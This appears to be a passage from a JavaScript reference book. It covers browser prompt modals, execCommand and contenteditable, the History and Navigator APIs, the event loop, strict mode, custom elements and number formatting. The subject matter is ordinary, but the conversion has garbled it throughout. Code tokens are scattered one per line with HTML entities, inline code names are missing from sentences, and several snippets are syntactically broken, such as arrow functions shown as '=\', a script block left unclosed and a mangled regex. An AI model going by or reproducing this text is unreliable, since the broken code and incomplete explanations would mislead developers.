  forEach    () method, similar to       Array   .   **prototype**   .   forEach
  -  -    -

  -

There&apos;s also a .(). It has two parameters, callback, which will be
executed for each element, and optional thisArg, which will be used as
**this** when executing callback.

  -
  Array   .   **prototype**   .   forEach   () and   Map.**prototype**   .   forEach
  -        

  -

callback has three arguments. The first two arguments are both the
current element of Set (for consistency with ()) and the third
argument is the Set itself.
>
mySet.forEach((value, value2, **set**) =&bsol;console.log(value)); *//
logs 1, 2 and 3*

# Chapter 44: Modals - Prompts

## Section 44.1: About User Prompts

[User
Prompts](https://www.w3.org/TR/html5/webappapis.html#user-prompts) are
methods part of the [Web Application
API](https://www.w3.org/TR/html5/webappapis.html#webappapis) used to
invoke Browser modals requesting a user action such as confirmation or
input.

**window.alert(message)**

Show a modal *popup* with a message to the user. Requires the user to
click &lbrack;OK&rbrack; to dismiss.

alert

(

&quot;Hello World&quot;

)

;

More information below in &quot;Using alert()&quot;.

**boolean = window.confirm(message)**

Show a modal *popup* with the provided message.
>
Provides &lbrack;OK&rbrack; and &lbrack;Cancel&rbrack; buttons which will respond with a
boolean value **true** / **false** respectively.

confirm

(

&quot;Delete this comment?&quot;

)

;

**result = window.prompt(message, defaultValue)**

Show a modal *popup* with the provided message and an input field with
an optional pre-filled value. Returns as result the user provided
input value.

prompt

(

&quot;Enter your website address&quot;

,

&quot;http://&quot;

)

;

More information below in &quot;Usage of prompt()&quot;.

**window.print()**

Opens a modal with document print options.

print

(

)

;

## Section 44.2: Persistent Prompt Modal

When using **prompt** a user can always click ***Cancel*** and no
value will be returned. To prevent empty values and make it more
**persistent**:

**&lt;**

**h**

**2**

**&gt;**

Welcome

**&lt;**

**span**

id

=

&quot;name&quot;

**&gt;**

**&lt;**

**/span**

**&gt;**

!

**&lt;**

**/h**

**2**

**&gt;**

&lt;

script

&gt;

*// Persistent Prompt modal*

**var**

userName

;

while

(

!

userName

)

{

userName

=

prompt

(

&quot;Enter your name&quot;

,

&quot;&quot;

)

;

**if**

(

!

userName

)

{

alert

(

&quot;Please, we need your name!&quot;

)

;

}

**else**

{

document.

getElementById

(

&quot;name&quot;

)

.

innerHTML

=

userName

;

}

}

&lt;

/

script

&gt;

[jsFiddle demo](https://jsfiddle.net/RokoCB/2r3ekqzk/1/)

## Section 44.3: Confirm to Delete element

  
  confirm
  

  

A way to use () is when some UI action does some *destructive* changes
to the page and is better accompanied by a **notification** and a
**user confirmation** - like i.e. before deleting a post message:

**&lt;**

**div**

id

=

&quot;post-102&quot;

**&gt;**

**&lt;**

**p**

**&gt;**

I like Confirm modals.

**&lt;**

**/p**

**&gt;**

**&lt;**

**a**

data-deletepost

=

&quot;post-102&quot;

**&gt;**

Delete post

**&lt;**

**/a**

**&gt;**

**&lt;**

**/div**

**&gt;**

**&lt;**

**div**

id

=

&quot;post-103&quot;

**&gt;**

**&lt;**

**p**

**&gt;**

That&apos;s way too cool!

**&lt;**

**/p**

**&gt;**

**&lt;**

**a**

data-deletepost

=

&quot;post-103&quot;

**&gt;**

Delete post

**&lt;**

**/a**

**&gt;**

**&lt;**

**/div**

**&gt;**

*// Collect all buttons*

**var**

deleteBtn

=

document.

querySelectorAll

(

&quot;&lbrack;data-deletepost&rbrack;&quot;

)

;

**function**

deleteParentPost

(

event

)

{

event.

preventDefault

(

)

;

*// Prevent page scroll jump on anchor click*

**if**

(

confirm

(

&quot;Really Delete this post?&quot;

)

)

{

**var**

post

=

document.

getElementById

(

**this**

.

dataset

.

deletepost

)

;

post.

parentNode

.

removeChild

(

post

)

;

*// TODO: remove that post from database*

}

*// else, do nothing*

}

*// Assign click event to buttons*

&lbrack;

&rbrack;

.

forEach

.

call

(

deleteBtn

,

**function**

(

btn

)

{

btn.

addEventListener

(

&quot;click&quot;

,

deleteParentPost

,

**false**

)

;

}

)

;

[jsFiddle demo](https://jsfiddle.net/RokoCB/6d652ycL/)

## Section 44.4: Usage of alert()

  
  alert
  

  

The () method of the window object displays an *alert box* with a
specified message and an OK or Cancel button. The text of that button
depends on the browser and can&apos;t be modified.
>
**Syntax**

alert

(

&quot;Hello world!&quot;

)

;

*// Or, alternatively&hellip;*

window.

alert

(

&quot;Hello world!&quot;

)

;

**Produces**

![](./images/image033.jpg){width="4.666666666666667in"
height="1.5041666666666667in"}

An *alert box* is often used if you want to make sure information
comes through to the user.
>
**Note:** The alert box takes the focus away from the current window,
and forces the browser to read the message.
>
Do not overuse this method, as it prevents the user from accessing
other parts of the page until the box is closed. Also it stops the
further code execution, until user clicks OK . (in particular, the
timers which were set with

  -
  setInterval                    () or         setTimeout
  - - 

  -

() don&apos;t tick either). The alert box only works in browsers, and its
design cannot be

modified.

**Parameter Description**

Required. Specifies the text to display in the alert box, or an object
converted into a string and message
>
displayed.
>
**Return value** alert function doesn&apos;t return any value

## Section 44.5: Usage of prompt()

Prompt will display a dialog to the user requesting their input. You
can provide a message that will be placed above the text field. The
return value is a string representing the input provided by the user.

**var**

name

=

prompt

(

&quot;What&apos;s your name?&quot;

)

;

console.

log

(

&quot;Hello, &quot;

&plus;

name

)

;

  
  prompt
  

  

You can also pass () a second parameter, which will be displayed as
the default text in the prompt&apos;s text field.

**var**

name

=

prompt

(

&apos;What

**&bsol;&amp;apos;**

s your name?&apos;

,

&apos; Name&hellip;&apos;

)

;

console.

log

(

&apos;Hello, &apos;

&plus;

name

)

;

**Parameter Description**

message Required. Text to display above the text field of the prompt.
default Optional. Default text to display in the text field when the
prompt is displayed.

# Chapter 45: execCommand and contenteditable

**commandId value**

⋮ **Inline formatting commands**

  
  backColor                              Color value String
   -
  bold                                   

  createLink                             URL String

  fontName                               Font family name

  fontSize                               &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;,
                                         &quot;5&quot;, &quot;6&quot;, &quot;7&quot;

  foreColor                              Color value String

  strikeThrough                          

  superscript                            

  unlink                                 
  

⋮ **Block formatting commands** delete

formatBlock &quot;address&quot;, &quot;dd&quot;, &quot;div&quot;, &quot;dt&quot;, &quot;h1&quot;, &quot;h2&quot;,
&quot;h3&quot;, &quot;h4&quot;, &quot;h5&quot;, &quot;h6&quot;, &quot;p&quot;, &quot;pre&quot;

forwardDelete insertHorizontalRule
>
insertHTML HTML String insertImage URL String insertLineBreak
insertOrderedList insertParagraph insertText Text string
insertUnorderedList justifyCenter justifyFull justifyLeft justifyRight
outdent
>
⋮ **Clipboard commands** copy Currently Selected String cut Currently
Selected String paste
>
⋮ **Miscellaneous commands** defaultParagraphSeparator redo selectAll
styleWithCSS undo useCSS

## Section 45.1: Listening to Changes of contenteditable

Events that work with most form elements (e.g., change, keydown,
keyup, keypress) do not work with contenteditable.
>
Instead, you can listen to changes of contenteditable contents with
the input event. Assuming contenteditableHtmlElement is a JS DOM
object that is contenteditable:

contenteditableHtmlElement.

addEventListener

(

&quot;input&quot;

,

**function**

(

)

{

console.

log

(

&quot;contenteditable element changed&quot;

)

;

}

)

;

## Section 45.2: Getting started

The HTML attribute contenteditable provides a simple way to turn a
HTML element into a user-editable area

**&lt;**

**div**

contenteditable

**&gt;**

You can

**&lt;**

**b**

**&gt;**

edit

**&lt;**

**/b**

**&gt;**

me!

**&lt;**

**/div**

**&gt;**

**Native Rich-Text editing**
>
Using **JavaScript** and
[execCommandW3C](https://w3c.github.io/editing/execCommand.html) you
can additionally pass more editing features to the currently focused
contenteditable element (specifically at the caret position or
selection).
>
The execCommand function method accepts 3 arguments

document.

execCommand

(

commandId

,

showUI

,

value

)

commandId

String. from the list of available &ast;&ast;

*commandId*

&ast;&ast;s

(

see:

***Parameters***

→

*commandId*

)

showUI

Boolean (not implemented. Use

**false**

)

value

String If a command expects a command-related String

***value***

, otherwise

&quot;&quot;

.

(see: ***Parameters***→*value*)
>
Example using the &quot;bold&quot; **command** and &quot;formatBlock&quot; (where a
**value** is expected):
>
document.execCommand(&quot;bold&quot;, **false**, &quot;&quot;); *// Make selected
text bold* document.execCommand(&quot;formatBlock&quot;, **false**, &quot;H2&quot;);
*// Make selected text Block-level &lt;h2&gt;*
>
**Quick Start Example:**

**&lt;**

**button**

data-edit

=

&quot;bold&quot;

**&gt;**

**&lt;**

**b**

**&gt;**

B

**&lt;**

**/b**

**&gt;**

**&lt;**

**/button**

**&gt;**

**&lt;**

**button**

data-edit

=

&quot;italic&quot;

**&gt;**

**&lt;**

**i**

**&gt;**

I

**&lt;**

**/i**

**&gt;**

**&lt;**

**/button**

**&gt;**

**&lt;**

**button**

data-edit

=

&quot;formatBlock:p&quot;

**&gt;**

P

**&lt;**

**/button**

**&gt;**

**&lt;**

**button**

data-edit

=

&quot;formatBlock:H1&quot;

**&gt;**

H1

**&lt;**

**/button**

**&gt;**

**&lt;**

**button**

data-edit

=

&quot;insertUnorderedList&quot;

**&gt;**

UL

**&lt;**

**/button**

**&gt;**

**&lt;**

**button**

data-edit

=

&quot;justifyLeft&quot;

**&gt;**

&#8676;

**&lt;**

**/button**

**&gt;**

**&lt;**

**button**

data-edit

=

&quot;justifyRight&quot;

**&gt;**

&#8677;

**&lt;**

**/button**

**&gt;**

**&lt;**

**button**

data-edit

=

&quot;removeFormat&quot;

**&gt;**

&times;

**&lt;**

**/button**

**&gt;**

**&lt;**

**div**

contenteditable

**&gt;**

**&lt;**

**p**

**&gt;**

Edit me!

**&lt;**

**/p**

**&gt;**

**&lt;**

**/div**

**&gt;**

**&lt;**

**script**

**&gt;**

&lbrack;&rbrack;

.forEach.call(document.querySelectorAll(&quot;&lbrack;data-edit&rbrack;&quot;),
function(btn)

{

btn.addEventListener(&quot;click&quot;, edit, false);

})

;

function edit(event) {

event.preventDefault();

var cmd_val = this.dataset.edit.split(&quot;:&quot;);

document.execCommand(cmd_val&lbrack;0&rbrack;, false, cmd_val&lbrack;1&rbrack;);

}

**&lt;**

**script**

**&gt;**

[jsFiddle demo](https://jsfiddle.net/RokoCB/az7f38w7/)
>
[Basic Rich-Text editor example (Modern
browsers)](https://jsfiddle.net/RokoCB/yvshdr4q/)
>
**Final thoughts**
>
Even being present for a long time (IE6), implementations and
behaviors of execCommand vary from browser to browser making
&quot;building a Fully-featured and cross-browser compatible WYSIWYG
editor&quot; a hard task to any experienced JavaScript developer.
>
Even if not yet fully standardized you can expect pretty decent
results on the newer browsers like **Chrome, Firefox, Edge**. If you
need *better* support for other browsers and more features like
HTMLTable editing etc. a rule of thumbs is to look for an **already
existent** and robust **Rich-Text** editor.

## Section 45.3: Copy to clipboard from textarea using execCommand(&quot;copy&quot;)

Example:

&lt;!

DOCTYPE html

&gt;

&lt;

html lang

=

&quot;en&quot;

&gt;

&lt;

head

&gt;

&lt;

meta charset

=

&quot;UTF-8&quot;

&gt;

&lt;

title

&gt;&lt;

/

title

&gt;

&lt;

/

head

&gt;

&lt;

body

&gt;

&lt;

textarea id

=

&quot;content&quot;

&gt;&lt;

/

textarea

&gt;

&lt;

input type

=

&quot;button&quot;

id

=

&quot;copyID&quot;

value

=

&quot;Copy&quot;

/&gt;

&lt;

script type

=

&quot;text/javascript&quot;

&gt;

**var**

button

=

document.

getElementById

(

&quot;copyID&quot;

)

,

input

=

document.

getElementById

(

&quot;content&quot;

)

;

button.

addEventListener

(

&quot;click&quot;

,

**function**

(

event

)

{

event.

preventDefault

(

)

;

input.

select

(

)

;

document.

execCommand

(

&quot;copy&quot;

)

;

}

)

;

&lt;

/

script

&gt;

&lt;

/

body

&gt;

&lt;

/

html

&gt;

document.

execCommand

(

&quot;copy&quot;

)

copies the current selection to the clipboard

## Section 45.4: Formatting

Users can add formatting to contenteditable documents or elements
using their browser&apos;s features, such as common keyboard shortcuts for
formatting ( Ctrl-B for **bold**, Ctrl-I for *italic*, etc.) or by
dragging and dropping images, links, or markup from the clipboard.
>
Additionally, developers can use JavaScript to apply formatting to the
current selection (highlighted text).
>
document.execCommand(&apos;bold&apos;, **false**, **null**); *// toggles bold
formatting* document.execCommand(&apos;italic&apos;, **false**, **null**); *//
toggles italic formatting* document.execCommand(&apos;underline&apos;,
**false**, **null**); *// toggles underline*

# Chapter 46: History

**Parameter Details**

domain The domain you want to update to title The title to update to
path The path to update to

## Section 46.1: history.pushState()

Syntax :

history.

pushState

(

state object

,

title

,

url

)

This method allows to ADD histories entries. For more reference,
Please have a look on this document : [pushState()
method](https://developer.mozilla.org/en-US/docs/Web/API/History_API#The_pushState()_method)

**Example :** window.history.pushState(&quot;http://example.ca&quot;, &quot;Sample
Title&quot;, &quot;/example/path.html&quot;);

This example inserts a new record into the history, address bar, and
page title.

  
  history.replaceState
  

  

Note this is different from the (). Which updates the current history
entry, rather than adding a new one.

## Section 46.2: history.replaceState()

**Syntax :**

history.

replaceState

(

data

,

title

&lbrack;

,

url

&rbrack;

)

This method modifies the current history entry instead of creating a
new one. Mainly used when we want to update URL of the current history
entry. window.history.replaceState(&quot;http://example.ca&quot;, &quot;Sample
Title&quot;, &quot;/example/path.html&quot;);
>
This example replaces the current history, address bar, and page
title.

  
  history.pushState
  

  

Note this is different from the (). Which inserts a new history entry,
rather than replacing the current one.

## Section 46.3: Load a specific URL from the history list

**go() method**
>
The go() method loads a specific URL from the history list. The
parameter can either be a number which goes to the URL within the
specific position (-1 goes back one page, 1 goes forward one page), or
a string. The string must be a partial or full URL, and the function
will go to the first URL that matches the string. Syntax

history.

go

(

number

&vert;

URL

)

Example

Click on the button to go back two pages:

**&lt;**

**html**

**&gt;**

**&lt;**

**head**

**&gt;**

**&lt;**

**script**

type

=

&quot;text/javascript&quot;

**&gt;**

function goBack()

{

window.history.go(-2)

}

**&lt;**

**/script**

**&gt;**

**&lt;**

**/head**

**&gt;**

**&lt;**

**body**

**&gt;**

**&lt;**

**input**

type

=

&quot;button&quot;

value

=

&quot;Go back 2 pages&quot;

onclick

=

&quot;goBack()&quot;

**/&gt;**

**&lt;**

**/body**

**&gt;**

**&lt;**

**/html**

**&gt;**

# Chapter 47: Navigator Object

## Section 47.1: Get some basic browser data and return it as a JSON object

The following function can be used to get some basic information about
the current browser and return it in JSON format.

**function**

getBrowserInfo

(

)

{

**var**

json

=

&quot;&lbrack;{&quot;

,

*/&ast; The array containing the browser info &ast;/*

info

=

&lbrack;

navigator.

userAgent

,

*// Get the User-agent*

navigator.

cookieEnabled

,

*// Checks whether cookies are enabled in browser*

navigator.

appName

,

*// Get the Name of Browser*

navigator.

language

,

*// Get the Language of Browser*

navigator.

appVersion

,

*// Get the Version of Browser*

navigator.

platform

*// Get the platform for which browser is compiled*

&rbrack;

,

*/&ast; The array containing the browser info names &ast;/*

infoNames

=

&lbrack;

&quot;userAgent&quot;

,

&quot;cookiesEnabled&quot;

,

&quot;browserName&quot;

,

&quot;browserLang&quot;

,

&quot;browserVersion&quot;

,

&quot;browserPlatform&quot;

&rbrack;

;

*/&ast; Creating the JSON object &ast;/*

**for**

(

**var**

i

=

0

;

i

&lt;

info.

length

;

i

++

)

{

**if**

(

i

===

info.

length

&minus;

1

)

{

json

+=

&apos;&quot;&apos;

&plus;

infoNames

&lbrack;

i

&rbrack;

&plus;

&apos;&quot;: &quot;&apos;

&plus;

info

&lbrack;

i

&rbrack;

&plus;

&apos;&quot;&apos;

;

}

**else**

{

json

+=

&apos;&quot;&apos;

&plus;

infoNames

&lbrack;

i

&rbrack;

&plus;

&apos;&quot;: &quot;&apos;

&plus;

info

&lbrack;

i

&rbrack;

&plus;

&apos;&quot;,&apos;

;

}

}

;

**return**

json

&plus;

&quot;}&rbrack;&quot;

;

}

;

# Chapter 48: BOM (Browser Object Model)

## Section 48.1: Introduction

The BOM (Browser Object Model) contains objects that represent the
current browser window and components; objects that model things like
*history, device&apos;s screen,* etc
>
The topmost object in BOM is the window object, which represents the
current browser window or tab.

**Document:**

represents current web page.

**History:**

represents pages in browser history.

**Location:**

represents URL of current page.

**Navigator:**

represents information about browser.

**Screen:**

represents device&apos;s display information.

## Section 48.2: Window Object Properties

The Window Object contains the following properties.

**Property Description**

window.closed Whether the window has been closed

  
  **&lt;iframe**
  

  

window.length Number of **&gt;** elements in window window.name Gets or
sets the name of the window window.innerHeight Height of window
window.innerWidth Width of window window.screenX X-coordinate of
pointer, relative to top left corner of screen window.screenY
Y-coordinate of pointer, relative to top left corner of screen
window.location Current URL of window object (or local file path)
window.history Reference to history object for browser window or tab.
>
window.screen Reference to screen object window.pageXOffset Distance
document has been scrolled horizontally window.pageYOffset Distance
document has been scrolled vertically

## Section 48.3: Window Object Methods

  
  Browser Object Model
  

  

The most important object in the is the window object. It helps in
accessing information about the browser and its components. To access
these features, it has various methods and properties.

+++
| **Method**         | **Description**                               |
+====================+=================================================+
| window.alert()     | Creates dialog box with message and an OK       |
|                    | button                                          |
+++
| window.blur()      | Remove focus from window                        |
+++
| window.close()     | Closes a browser window                         |
+++
| window.confirm()   | Creates dialog box with message, an OK button   |
|                    | and a cancel button                             |
+++

window.getComputedStyle() Get CSS styles applied to an element

  
  window.moveTo(x,y)     Move a window&apos;s left and top edge to supplied
                         coordinates
  - -
  window.open()          Opens new browser window with URL specified as
                         parameter

  window.print()         Tells browser that user wants to print contents
                         of current page

  window.prompt()        Creates dialog box for retrieving user input

  window.scrollBy()      Scrolls the document by the specified number of
                         pixels

  window.scrollTo()      Scrolls the document to the specified
                         coordinates

  window.setInterval()   Do something repeatedly at specified intervals

  window.setTimeout()    Do something after a specified amount of time

  window.stop()          Stop window from loading
  

# Chapter 49: The Event Loop

## Section 49.1: The event loop in a web browser

The vast majority of modern JavaScript environments work according to
an *event loop*. This is a common concept in computer programming
which essentially means that your program continually waits for new
things to happen, and when they do, reacts to them. The *host
environment* calls into your program, spawning a &quot;turn&quot; or &quot;tick&quot;
or &quot;task&quot; in the event loop, which then *runs to completion*. When
that turn has finished, the host environment waits for something else
to happen, before all this starts.
>
A simple example of this is in the browser. Consider the following
example:

&lt;!

DOCTYPE html

&gt;

**&lt;**

**title**

**&gt;**

Event loop example

**&lt;**

**/title**

**&gt;**

**&lt;**

**script**

**&gt;**

console.log(&quot;this a script entry point&quot;);

document.body.onclick = () =&bsol;{

console.log(&quot;onclick&quot;);

}

;

setTimeout(() =&bsol;{

console.log(&quot;setTimeout callback log 1&quot;);

console.log(&quot;setTimeout callback log 2&quot;);

}

, 100);

**&lt;**

**/script**

**&gt;**

In this example, the host environment is the web browser.

  
  **&lt;script**
  

  

1.  The HTML parser will first execute the **&gt;**. It will run to
    completion.

2.  The call to
    [setTimeout](https://html.spec.whatwg.org/multipage/webappapis.html#dom-settimeout)
    tells the browser that, after 100 milliseconds, it should enqueue a
    [task](https://html.spec.whatwg.org/multipage/webappapis.html#concept-task)
    to perform the given action.

3.  In the meantime, the event loop is then responsible for continually
    checking if there&apos;s something else to do:

for example, rendering the web page.

4.  After 100 milliseconds, if the event loop is not busy for some other
    reason, it will see the task that setTimeout enqueues, and run the
    function, logging those two statements.

5.  At any time, if someone clicks on the body, the browser will post a
    task to the event loop to run the click handler function. The event
    loop, as it goes around continually checking what to do, will see
    this, and run that function.

You can see how in this example there are several different types of
entry points into JavaScript code, which the event loop invokes:

  
  **&lt;script**
  

  

The **&gt;** element is invoked immediately
>
The setTimeout task is posted to the event loop and run once
>
The click handler task can be posted many times and run each time
>
Each turn of the event loop is responsible for many things; only some
of them will invoke these JavaScript tasks. For full details, [see the
HTML
specification](https://html.spec.whatwg.org/multipage/webappapis.html#event-loop-processing-model)

  
  setTimeout callback log
  

  

One last thing: what do we mean by saying that each event loop task
&quot;runs to completion&quot;? We mean that it is not generally possible to
interrupt a block of code that is queued to run as a task, and it is
never possible to run code interleaved with another block of code. For
example, even if you clicked at the perfect time, you could never get
the above code to log &quot;onclick&quot; in between the two 1/2&quot;s. This is
due to the way the taskposting works; it is cooperative and
queue-based, instead of preemptive.

## Section 49.2: Asynchronous operations and the event loop

Many interesting operations in common JavaScript programming
environments are asynchronous. For example, in the browser we see
things like

window.

setTimeout

(

(

)

=&gt;

{

console.

log

(

&quot;this happens later&quot;

)

;

}

,

100

)

;

and in Node.js we see things like

fs.

readFile

(

&quot;file.txt&quot;

,

(

err

,

data

)

=&gt;

{

console.

log

(

&quot;data&quot;

)

;

}

)

;

How does this fit with the event loop?

  
  file.txt
  

  

How this works is that when these statements execute, they tell the
*host environment* (i.e., the browser or Node.js runtime,
respectively) to go off and do something, probably in another thread.
When the host environment is done doing that thing (respectively,
waiting 100 milliseconds or reading the file ) it will post a task to
the event loop, saying &quot;call the callback I was given earlier with
these arguments&quot;.
>
The event loop is then busy doing its thing: rendering the webpage,
listening for user input, and continually looking for posted tasks.
When it sees these posted tasks to call the callbacks, it will call
back into JavaScript. That&apos;s how you get asynchronous behavior!

# Chapter 50: Strict mode

## Section 50.1: For entire scripts

  
  &quot;use strict&quot;
  

  

Strict mode can be applied on entire scripts by placing the statement
; before any other statements.

&quot;use strict&quot;

;

*// strict mode now applies for the rest of the script*

Strict mode is only enabled in scripts where you define &quot;use
strict&quot;. You can combine scripts with and without strict mode,
because the strict state is not shared among different scripts.

Version ≥ 6

**Note:** All code written inside ES2015+ modules and classes are
strict by default.

## Section 50.2: For functions

  
  &quot;use strict&quot;
  

  

Strict mode can also be applied to single functions by prepending the
; statement at the beginning of the function declaration.

**function**

strict

(

)

{

&quot;use strict&quot;

;

*// strict mode now applies to the rest of this function*

**var**

innerFunction

=

**function**

(

)

{

*// strict mode also applies here*

}

;

}

**function**

notStrict

(

)

{

*// but not here*

}

Strict mode will also apply to any inner scoped functions.

## Section 50.3: Changes to properties

Strict mode also prevents you from deleting undeletable properties.

&quot;use strict&quot;

;

**delete**

Object

.

**prototype**

;

*// throws a TypeError*

The above statement would simply be ignored if you don&apos;t use strict
mode, however now you know why it does not execute as expected.
>
It also prevents you from extending a non-extensible property.

**var**

myObject

=

{

name

:

&quot;My Name&quot;

}

Object

.

preventExtensions

(

myObject

)

;

**function**

setAge

(

)

{

myObject.

age

=

25

;

*// No errors*

}

**function**

setAge

(

)

{

&quot;use strict&quot;

;

myObject.

age

=

25

;

*// TypeError: can&apos;t define property &quot;age&quot;: Object is not extensible*

}

## Section 50.4: Changes to global properties

In a non-strict-mode scope, when a variable is assigned without being
initialized with the **var**, **const** or the **let** keyword, it is
automatically declared in the global scope:

a

=

12

;

console.

log

(

a

)

;

*// 12*

In strict mode however, any access to an undeclared variable will
throw a reference error:

&quot;use strict&quot;

;

a

=

12

;

*// ReferenceError: a is not defined*

console.

log

(

a

)

;

This is useful because JavaScript has a number of possible events that
are sometimes unexpected. In non-strictmode, these events often lead
developers to believe they are bugs or unexpected behavior, thus by
enabling strictmode, any errors that are thrown enforces them to know
exactly what is being done.
>
&quot;use strict&quot;;
>
*// Assuming a global variable mistypedVariable exists*
mistypedVaraible = 17; *// this line throws a ReferenceError due to
the*
>
*// misspelling of variable*
>
This code in strict mode displays one possible scenario: it throws a
reference error which points to the assignment&apos;s line number,
allowing the developer to immediately detect the mistype in the
variable&apos;s name.
>
In non-strict-mode, besides the fact that no error is thrown and the
assignment is successfully made, the mistypedVaraible will be
automatically declared in the global scope as a global variable. This
implies that the developer needs to look up manually this specific
assignment in the code.
>
Furthermore, by forcing declaration of variables, the developer cannot
accidentally declare global variables inside functions. In
non-strict-mode:

**function**

foo

(

)

{

a

=

&quot;bar&quot;

;

*// variable is automatically declared in the global scope*

}

foo

(

)

;

console.

log

(

a

)

;

*// &gt;&bsol;bar*

In strict mode, it is necessary to explicitly declare the variable:

**function**

strict_scope

(

)

{

&quot;use strict&quot;

;

**var**

a

=

&quot;bar&quot;

;

*// variable is local*

}

strict_scope

(

)

;

console.

log

(

a

)

;

*// &gt;&amp;quot;ReferenceError: a is not defined&quot;*

The variable can also be declared outside and after a function,
allowing it to be used, for instance, in the global scope:

**function**

strict_scope

(

)

{

&quot;use strict&quot;

;

a

=

&quot;bar&quot;

;

*// variable is global*

}

**var**

a

;

strict_scope

(

)

;

console.

log

(

a

)

;

*// &gt;&bsol;bar*

## Section 50.5: Duplicate Parameters

Strict mode does not allow you to use duplicate function parameter
names.

**function**

foo

(

bar

,

bar

)

{

}

*// No error. bar is set to the final argument when called*

&quot;use strict&quot;

;

**function**

foo

(

bar

,

bar

)

{

}

;

*// SyntaxError: duplicate formal argument bar*

## Section 50.6: Function scoping in strict mode

In Strict Mode, functions declared in a local block are inaccessible
outside the block.

&quot;use strict&quot;

;

{

f

(

)

;

*// &apos;hi&apos;*

**function**

f

(

)

{

console.

log

(

&apos;hi&apos;

)

;

}

}

f

(

)

;

*// ReferenceError: f is not defined*

Scope-wise, function declarations in Strict Mode have the same kind of
binding as **let** or **const**.

## Section 50.7: Behaviour of a function&apos;s arguments list

arguments object behave different in *strict* and *non strict* mode.
In *non-strict* mode, the argument object will reflect the changes in
the value of the parameters which are present, however in *strict*
mode any changes to the value of the parameter will not be reflected
in the argument object.

**function**

add

(

a

,

b

)

{

console.

log

(

arguments

&lbrack;

0

&rbrack;

,

arguments

&lbrack;

1

&rbrack;

)

;

*// Prints : 1,2*

a

=

5

,

b

=

10

;

console.

log

(

arguments

&lbrack;

0

&rbrack;

,

arguments

&lbrack;

1

&rbrack;

)

;

*// Prints : 5,10*

}

add

(

1

,

2

)

;

For the above code, the arguments object is changed when we change the
value of the parameters. However, for *strict* mode, the same will not
be reflected.

**function**

add

(

a

,

b

)

{

&apos;use strict&apos;

;

console.

log

(

arguments

&lbrack;

0

&rbrack;

,

arguments

&lbrack;

1

&rbrack;

)

;

*// Prints : 1,2*

a

=

5

,

b

=

10

;

console.

log

(

arguments

&lbrack;

0

&rbrack;

,

arguments

&lbrack;

1

&rbrack;

)

;

*// Prints : 1,2*

}

It&apos;s worth noting that, if any one of the parameters is
**undefined**, and we try to change the value of the parameter in both
*strict-mode* or *non-strict* mode the arguments object remains
unchanged.
>
**Strict mode**

**function**

add

(

a

,

b

)

{

&apos;use strict&apos;

;

console.

log

(

arguments

&lbrack;

0

&rbrack;

,

arguments

&lbrack;

1

&rbrack;

)

;

*// undefined,undefined*

*// 1,undefined*

a

=

5

,

b

=

10

;

console.

log

(

arguments

&lbrack;

0

&rbrack;

,

arguments

&lbrack;

1

&rbrack;

)

;

*// undefined,undefined*

*// 1, undefined*

}

add

(

)

;

*// undefined,undefined*

*// undefined,undefined*

add

(

1

)

*// 1, undefined*

*// 1, undefined*

**Non-Strict Mode**

**function**

add

(

a

,

b

)

{

console.

log

(

arguments

&lbrack;

0

&rbrack;

,

arguments

&lbrack;

1

&rbrack;

)

;

a

=

5

,

b

=

10

;

console.

log

(

arguments

&lbrack;

0

&rbrack;

,

arguments

&lbrack;

1

&rbrack;

)

;

}

add

(

)

;

*// undefined,undefined*

*// undefined,undefined*

add

(

1

)

;

*// 1, undefined*

*// 5, undefined*

## Section 50.8: Non-Simple parameter lists

**function**

a

(

x

=

5

)

{

&quot;use strict&quot;

;

}

is invalid JavaScript and will throw a

SyntaxError

because you cannot use the directive

&quot;use strict&quot;

in a function

with Non-Simple Parameter list like the one above - default assignment

x

=

5

Non-Simple parameters include -

Default assignment

**function**

a

(

x

=

1

)

{

&quot;use strict&quot;

;

}

Destructuring

**function**

a

(

{

x

}

)

{

&quot;use strict&quot;

;

}

Rest params

**function**

a

(

&hellip;

args

)

{

&quot;use strict&quot;

;

}

# Chapter 51: Custom Elements

**Parameter Details**

name The name of the new custom element. options.extends The name of
the native element being extended, if any. options.prototype The
custom prototype to use for the custom element, if any.

## Section 51.1: Extending Native Elements

  
  **&lt;img&gt;**
  

  

It&apos;s possible to extent native elements, but their descendants don&apos;t
get to have their own tag names. Instead, the is attribute is used to
specify which subclass an element is supposed to use. For example,
here&apos;s an extension of the element which logs a message to the
console when it&apos;s loaded.

**const**

**prototype**

=

Object

.

create

(

HTMLImageElement.

**prototype**

)

;

**prototype**

.

createdCallback

=

**function**

(

)

{

**this**

.

addEventListener

(

&apos;load&apos;

,

event

=&gt;

{

console.

log

(

&quot;Image loaded successfully.&quot;

)

;

}

)

;

}

;

document.

registerElement

(

&apos;ex-image&apos;

,

{

extends

:

&apos;img&apos;

,

**prototype**

:

**prototype**

}

)

;

**&lt;**

**img**

is

=

&quot;ex-image&quot;

src

=

&quot;http://cdn.sstatic.net/Sites/stackoverflow/img/apple-touch-icon.png&quot;

**/&gt;**

## Section 51.2: Registering New Elements

  
  **&lt;initially-hidden&gt;**
  

  

Defines an custom element which hides its contents until a specified
number of seconds have elapsed.

**const**

InitiallyHiddenElement

=

document.

registerElement

(

&apos;initially-hidden&apos;

,

class

extends

HTMLElement

{

createdCallback

(

)

{

**this**

.

revealTimeoutId

=

**null**

;

}

attachedCallback

(

)

{

**const**

seconds

=

Number

(

**this**

.

getAttribute

(

&apos;for&apos;

)

)

;

**this**

.

style

.

display

=

&apos;none&apos;

;

**this**

.

revealTimeoutId

=

setTimeout

(

(

)

=&gt;

{

**this**

.

style

.

display

=

&apos;block&apos;

;

}

,

seconds

&ast;

1000

)

;

}

detachedCallback

(

)

{

**if**

(

**this**

.

revealTimeoutId

)

{

clearTimeout

(

**this**

.

revealTimeoutId

)

;

**this**

.

revealTimeoutId

=

**null**

;

}

}

}

)

;

**&lt;**

**initially-hidden**

for

=

&quot;2&quot;

**&gt;**

Hello

**&lt;**

**/initially-hidden**

**&gt;**

**&lt;**

**initially-hidden**

for

=

&quot;5&quot;

**&gt;**

World

**&lt;**

**/initially-hidden**

**&gt;**

# Chapter 52: Data Manipulation

## Section 52.1: Format numbers as money

  
  1234567.89 =&amp;quot;1,234,567.89&quot;
  

  

Fast and short way to format value of type Number as money, e.g. :

**var**

num

=

1234567.89

,

formatted

;

formatted

=

num.

toFixed

(

2

)

.

replace

(

*/&bsol;&bsol;d(?=(&bsol;&bsol;d{3})+&amp;period;)/g*

,

&apos;&dollar;&,&apos;

)

;

*// &quot;1,234,567.89&quot;*

+-+-+-+
